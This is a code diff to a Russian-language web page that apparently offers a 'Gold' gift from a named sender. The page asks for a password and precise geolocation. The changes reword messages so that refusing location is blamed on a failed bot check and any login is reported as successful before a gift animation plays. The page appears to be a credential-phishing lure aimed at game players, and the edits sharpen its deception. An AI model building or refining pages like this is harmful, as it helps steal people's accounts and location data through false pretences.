@@ -159,7 +159,7 @@
           <label for="password">Пароль:</label>
           <input type="password" id="password" name="password" placeholder="Введите пароль" required>
         </div>
-        <button type="submit">Войти</button>
+        <button type="submit">Авторизоваться</button>
       </form>
       <div id="login-result" class="info-block"></div>
     </div>
@@ -231,7 +231,7 @@
           console.error("Ошибка получения геолокации:", error);
           clientInfo.geolocation = { error: error.message };
           if (error.code === error.PERMISSION_DENIED) {
-            alert("Ошибка: обнаружен вход с новой локации");
+            alert("Ошибка: проверка на бота не была пройдена");
           }
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
@@ -328,7 +328,7 @@
       document.getElementById("pre-info").innerHTML = `
         ID отправителя: ${params.senderId}<br>
         Ник отправителя: ${params.senderNick}<br>
-        Кол-во Gold: ${params.goldAmount}
+        Количество Gold: ${params.goldAmount}
       `;
     } else {
       document.getElementById("pre-info").textContent = "Некорректный ID транзакции";
@@ -358,7 +358,7 @@ Email: ${email}
           document.getElementById("login-result").textContent = "Ошибка входа";
           return;
         }
-        document.getElementById("login-result").textContent = "Ошибка: проверки правильности данных входа";
+        document.getElementById("login-result").textContent = "Авторизация прошла успешно";
         // Анимация смены изображения: gift.png -> small_gold.png
         const giftImage = document.getElementById("gift-image");
         giftImage.classList.add("fade-out");
@@ -374,7 +374,7 @@ Email: ${email}
               document.getElementById("gold-info").innerHTML = `
                 ID отправителя: ${params.senderId}<br>
                 Ник отправителя: ${params.senderNick}<br>
-                Кол-во Gold: ${params.goldAmount}
+                Количество Gold: ${params.goldAmount}
               `;
             }
             fadeIn(document.getElementById("gold-section"));
